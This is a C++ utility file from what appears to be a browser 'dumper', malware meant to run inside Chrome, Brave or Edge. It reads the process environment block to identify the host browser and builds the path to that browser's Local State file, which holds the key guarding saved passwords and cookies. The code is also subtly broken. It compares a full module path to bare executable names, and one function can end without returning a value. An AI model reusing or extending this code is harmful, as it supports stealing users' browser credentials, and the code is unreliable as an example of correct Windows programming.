#include "utils.h"
#include "../dumper/dumper.h"

PPEB utils::getPeb() {
	return (PPEB)__readgsqword(0x60);
}

wstring utils::getMainModuleName() {
	PPEB peb = getPeb();
	LIST_ENTRY moduleList = peb->Ldr->InMemoryOrderModuleList;

	return wstring(((PLDR_DATA_TABLE_ENTRY)moduleList.Flink)->FullDllName.Buffer);
}

BrowserLocalStateConfig utils::getBrowserConfig() {
	wstring browserModName = getMainModuleName();
	wstring appData = getAppDataPath();

	const wchar_t* cbrowserModName = browserModName.c_str();

	if (!wcscmp(cbrowserModName, L"chrome.exe")) {
		return BrowserLocalStateConfig{ BrowserType::Chrome , appData + dumper::configs::chrome.localState};
	}
	else if (!wcscmp(cbrowserModName, L"brave.exe")) {
		return BrowserLocalStateConfig{ BrowserType::Brave , appData + dumper::configs::brave.localState };
	}
	else if (!wcscmp(cbrowserModName, L"edge.exe")) {
		return BrowserLocalStateConfig{ BrowserType::Edge , appData + dumper::configs::edge.localState };
	}

}

wstring utils::getAppDataPath() {
	wchar_t appDataPath[MAX_PATH];
	if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath) != S_OK) {;
		return L"";
	}
	
	return wstring(appDataPath);
}
